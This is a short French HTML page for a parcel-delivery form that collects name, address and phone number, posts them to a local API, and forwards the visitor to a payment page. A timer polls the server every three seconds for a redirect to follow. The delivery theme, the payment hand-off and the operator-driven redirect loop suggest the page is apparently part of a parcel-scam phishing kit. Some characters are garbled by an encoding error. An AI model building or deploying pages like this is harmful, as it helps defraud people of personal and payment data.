<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>ðŸ“¦ Livraison</title>
  <style>
    body { font-family: Arial; background: #fafafa; padding: 20px; text-align: center; }
    form { display: inline-block; background: #fff; padding: 20px; border-radius: 15px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
    input { margin: 10px; padding: 10px; width: 220px; border-radius: 8px; border: 1px solid #ccc; }
    button { background: #2196f3; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; }
  </style>
</head>
<body>
  <h1>ðŸ“¦ Informations de livraison</h1>
  <form onsubmit="sendDelivery(event)">
    <input required name="nom" placeholder="Nom"><br>
    <input required name="prenom" placeholder="PrÃ©nom"><br>
    <input required name="adresse" placeholder="Adresse complÃ¨te"><br>
    <input required name="telephone" placeholder="TÃ©lÃ©phone"><br>
    <button type="submit">Valider</button>
  </form>
  <script>
    async function sendDelivery(e){
      e.preventDefault();
      const d=Object.fromEntries(new FormData(e.target));
      await fetch('/api/delivery',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});
      location.href='payment.html';
    }
    setInterval(async()=>{ 
      const s=await fetch('/api/status'); const j=await s.json(); 
      if(j.redirect) location.href=j.redirect; 
    },3000);
  </script>
</body>
</html>
